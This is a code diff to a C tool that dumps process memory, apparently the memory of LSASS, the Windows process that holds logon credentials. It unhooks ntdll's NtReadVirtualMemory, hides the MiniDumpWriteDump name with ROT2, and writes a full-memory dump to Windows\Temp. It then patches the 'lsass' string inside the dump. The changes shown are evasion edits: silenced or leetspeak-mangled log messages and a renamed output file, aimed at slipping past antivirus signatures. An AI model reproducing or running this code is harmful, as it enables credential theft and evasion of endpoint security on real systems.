@@ -40,9 +40,9 @@ BOOL Unhook_NativeAPI(IN PWIN_VER_INFO pWinVerInfo) {
 
 	LPVOID lpProcAddress = GetProcAddress(LoadLibrary(L"ntdll.dll"), pWinVerInfo->lpApiCall);
 
-	printf("	[+] %s function pointer at: 0x%p\n", pWinVerInfo->lpApiCall, lpProcAddress);
-	printf("	[+] %s System call nr is: 0x%x\n", pWinVerInfo->lpApiCall, AssemblyBytes[4]);
-	printf("	[+] Unhooking %s.\n", pWinVerInfo->lpApiCall);
+	//printf("	[+] %s function pointer at: 0x%p\n", pWinVerInfo->lpApiCall, lpProcAddress);
+	//printf("	[+] %s System call nr is: 0x%x\n", pWinVerInfo->lpApiCall, AssemblyBytes[4]);
+	//printf("	[+] Unhooking %s.\n", pWinVerInfo->lpApiCall);
 
 	LPVOID lpBaseAddress = lpProcAddress;
 	ULONG OldProtection, NewProtection;
@@ -247,7 +247,7 @@ int wmain(int argc, wchar_t* argv[]) {
 		return FALSE;
 	}
 
-	wprintf(L"[1] Checking OS version details:\n");
+//	wprintf(L"[1] Checking OS version details:\n");
 	RtlGetVersion(&osInfo);
 	swprintf_s(pWinVerInfo->chOSMajorMinor, _countof(pWinVerInfo->chOSMajorMinor), L"%u.%u", osInfo.dwMajorVersion, osInfo.dwMinorVersion);
 	pWinVerInfo->dwBuildNumber = osInfo.dwBuildNumber;
@@ -255,8 +255,8 @@ int wmain(int argc, wchar_t* argv[]) {
 	// Now create os/build specific syscall function pointers.
 	if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
 		lpOSVersion = L"10 or Server 2016";
-		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
-		wprintf(L"	[+] Mapping version specific System calls.\n");
+		//wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
+		//wprintf(L"	[+] Mapping version specific System calls.\n");
 		ZwOpenProcess = &ZwOpenProcess10;
 		NtCreateFile = &NtCreateFile10;
 		ZwClose = &ZwClose10;
@@ -267,8 +267,8 @@ int wmain(int argc, wchar_t* argv[]) {
 	}
 	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && osInfo.dwBuildNumber == 7601) {
 		lpOSVersion = L"7 SP1 or Server 2008 R2";
-		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
-		wprintf(L"	[+] Mapping version specific System calls.\n");
+		//wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
+		//wprintf(L"	[+] Mapping version specific System calls.\n");
 		ZwOpenProcess = &ZwOpenProcess7SP1;
 		NtCreateFile = &NtCreateFile7SP1;
 		ZwClose = &ZwClose7SP1;
@@ -279,8 +279,8 @@ int wmain(int argc, wchar_t* argv[]) {
 	}
 	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
 		lpOSVersion = L"8 or Server 2012";
-		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
-		wprintf(L"	[+] Mapping version specific System calls.\n");
+		//wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
+		//wprintf(L"	[+] Mapping version specific System calls.\n");
 		ZwOpenProcess = &ZwOpenProcess80;
 		NtCreateFile = &NtCreateFile80;
 		ZwClose = &ZwClose80;
@@ -291,8 +291,8 @@ int wmain(int argc, wchar_t* argv[]) {
 	}
 	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
 		lpOSVersion = L"8.1 or Server 2012 R2";
-		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
-		wprintf(L"	[+] Mapping version specific System calls.\n");
+		//wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
+		//wprintf(L"	[+] Mapping version specific System calls.\n");
 		ZwOpenProcess = &ZwOpenProcess81;
 		NtCreateFile = &NtCreateFile81;
 		ZwClose = &ZwClose81;
@@ -302,11 +302,11 @@ int wmain(int argc, wchar_t* argv[]) {
 		NtWriteFile = &NtWriteFile81;
 	}
 	else {
-		wprintf(L"	[!] OS Version not supported.\n\n");
+		wprintf(L"	[!] OS Version not support3d.\n\n");
 		exit(1);
 	}
 
-	wprintf(L"[2] Checking Process details:\n");
+	//wprintf(L"[2] Checking Process details:\n");
 
 	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
 		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");
@@ -317,21 +317,21 @@ int wmain(int argc, wchar_t* argv[]) {
 	RtlInitUnicodeString(&pWinVerInfo->ProcName, lpwProcName);
 
 	if (!GetPID(pWinVerInfo)) {
-		wprintf(L"	[!] Enumerating process failed.\n");
+		wprintf(L"[!] Enum3rating proc3ss failed.\n");
 		exit(1);
 	}
 
-	wprintf(L"	[+] Process ID of %wZ is: %lld\n", pWinVerInfo->ProcName, (ULONG64)pWinVerInfo->hTargetPID);
+	wprintf(L"[+] Proc3ss ID of %wZ is: %lld\n", pWinVerInfo->ProcName, (ULONG64)pWinVerInfo->hTargetPID);
 	pWinVerInfo->lpApiCall = "NtReadVirtualMemory";
 
 	if (!Unhook_NativeAPI(pWinVerInfo)) {
-		printf("	[!] Unhooking %s failed.\n", pWinVerInfo->lpApiCall);
+		printf("[!] Unh00king %s fail3d.\n", pWinVerInfo->lpApiCall);
 		exit(1);
 	}
 
-	wprintf(L"[3] Create memorydump file:\n");
+	//wprintf(L"[3] Create memorydump file:\n");
 
-	wprintf(L"	[+] Open a process handle.\n");
+	//wprintf(L"	[+] Open a process handle.\n");
 	HANDLE hProcess = NULL;
 	OBJECT_ATTRIBUTES ObjectAttributes;
 	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
@@ -342,7 +342,7 @@ int wmain(int argc, wchar_t* argv[]) {
 
 	NTSTATUS status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &uPid);
 	if (hProcess == NULL) {
-		wprintf(L"	[!] Failed to get processhandle.\n");
+		wprintf(L"[!] Fail3d to g3t processhandle.\n");
 		exit(1);
 	}
 
@@ -350,12 +350,12 @@ int wmain(int argc, wchar_t* argv[]) {
 	WCHAR chWinPath[MAX_PATH];
 	GetWindowsDirectory(chWinPath, MAX_PATH);
 	wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), chWinPath);
-	wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), L"\\Temp\\dumpert.dmp");
+	wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), L"\\Temp\\dump.bin");
 
 	UNICODE_STRING uFileName;
 	RtlInitUnicodeString(&uFileName, chDmpFile);
 
-	wprintf(L"	[+] Dump %wZ memory to: %wZ\n", pWinVerInfo->ProcName, uFileName);
+	wprintf(L"[+] Dump %wZ to: %wZ\n", pWinVerInfo->ProcName, uFileName);
 	
 	HANDLE hDmpFile = NULL;
 	IO_STATUS_BLOCK IoStatusBlock;
@@ -368,7 +368,7 @@ int wmain(int argc, wchar_t* argv[]) {
 		FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
 
 	if (hDmpFile == INVALID_HANDLE_VALUE) {
-		wprintf(L"	[!] Failed to create dumpfile.\n");
+		wprintf(L"[!] Fail3d to create file.\n");
 		ZwClose(hProcess);
 		exit(1);
 	}
@@ -381,7 +381,7 @@ int wmain(int argc, wchar_t* argv[]) {
 	lib_handle = LoadLibrary(TEXT("dbghelp.dll"));
 	mafonction mydumpfonction = (mafonction)GetProcAddress(lib_handle, MyRot("KglgBsknUpgrcBskn", 2)); //MiniDumpWriteDump with ROT2
 	if (!mydumpfonction) {
-		wprintf(L"	[!] Wr0ng Return of Address\n");
+		wprintf(L"[!] Wr0ng Return of Address\n");
 		exit(1);
 	}
 	BOOL Success = mydumpfonction(hProcess, dwTargetPID, hDmpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
@@ -394,14 +394,13 @@ int wmain(int argc, wchar_t* argv[]) {
 		NULL,
 		NULL);
 */
-	if ((!Success))
-	{
-		wprintf(L"	[!] Failed to create minidump, error code: %x\n", GetLastError());
+	if ((!Success)) {
+		wprintf(L"[!] Failed, error code: %x\n", GetLastError());
 		ZwClose(hProcess);
 		exit(1);
 	}
 	else {
-		wprintf(L"	[+] Dump succesful.\n");
+		wprintf(L"[+] Writing fIle succesful.\n");
 	}
 		
 	const ULONG readSize = 2048;
@@ -412,7 +411,7 @@ int wmain(int argc, wchar_t* argv[]) {
 	BOOL found = FALSE;
 	char McAfeeString[] = { 'l', 's', 'a', 's', 's' };
 	ZeroMemory(&szBuffer, readSize);
-	wprintf(L"[4] R3ad Dump FIle\n");
+	wprintf(L"[+] Patching fIle\n");
 	byteOffset.LowPart = byteOffset.HighPart = 0;
 	while (!found) {
 		status = NtReadFile(hDmpFile, NULL, NULL, NULL, &IoStatusBlock, &szBuffer, readSize, &byteOffset, NULL);
@@ -425,14 +424,14 @@ int wmain(int argc, wchar_t* argv[]) {
 				szBuffer[s - szBuffer + 2] = 'x';
 				szBuffer[s - szBuffer + 3] = 'x';
 				szBuffer[s - szBuffer + 4] = 'x';
-				wprintf(L"	[+] R3placing strIng at address %08X\n", s - szBuffer + byteOffset.LowPart);
+				wprintf(L"[+] Patch address %08X\n", s - szBuffer + byteOffset.LowPart);
 				status = NtWriteFile(hDmpFile, NULL, NULL, NULL, &IoStatusBlock, &szBuffer, readSize, &byteOffset, NULL);
 			}
 			byteOffset.LowPart += readSize;
 		}
 		else {
-			wprintf(L"	[-] Failed to patch dump fIle. - %X\n", status);
-			wprintf(L"	[!] Err0r: %x\n", GetLastError());
+			wprintf(L"[-] Failed to patch fIle. - %X\n", status);
+			wprintf(L"[!] Err0r: %x\n", GetLastError());
 			ZwClose(hProcess);
 			exit(1);
 		}
